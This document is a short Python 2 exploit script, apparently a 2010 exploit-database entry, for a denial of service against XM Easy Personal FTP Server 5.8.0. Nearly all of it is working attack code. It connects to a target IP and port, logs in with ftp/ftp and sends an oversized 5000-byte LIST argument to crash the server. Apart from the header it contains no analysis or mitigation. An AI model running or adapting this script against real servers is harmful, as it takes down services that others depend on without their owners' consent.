# Exploit Title: XM Easy Personal FTP Server 5.8.0 'LIST' command DoS
# Date: August 11, 2010
# Author: Glafkos Charalambous
# Software Link:
# Version: 5.8.0
# Tested on: Windows XP SP3 En

import socket
import sys

if len(sys.argv) != 3:
    print "Usage: ./xmeasy_LIST.py <Target IP> <Port>"
    sys.exit(1)
  
target = sys.argv[1]
port = int(sys.argv[2])

buffer = "\x41" * 5000
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    connect = s.connect((target, port))
    print "[+] Connected"
except:
    print "[!] Connection Failed"
    sys.exit(0)
s.recv(1024)
 	
s.send('User ftp\r\n')
s.recv(1024)
s.send('PASS ftp\r\n')
s.recv(1024)
print "[+] Sending payload..."
s.send('LIST '+ buffer +'\r\n')
s.recv(1024)
s.close()
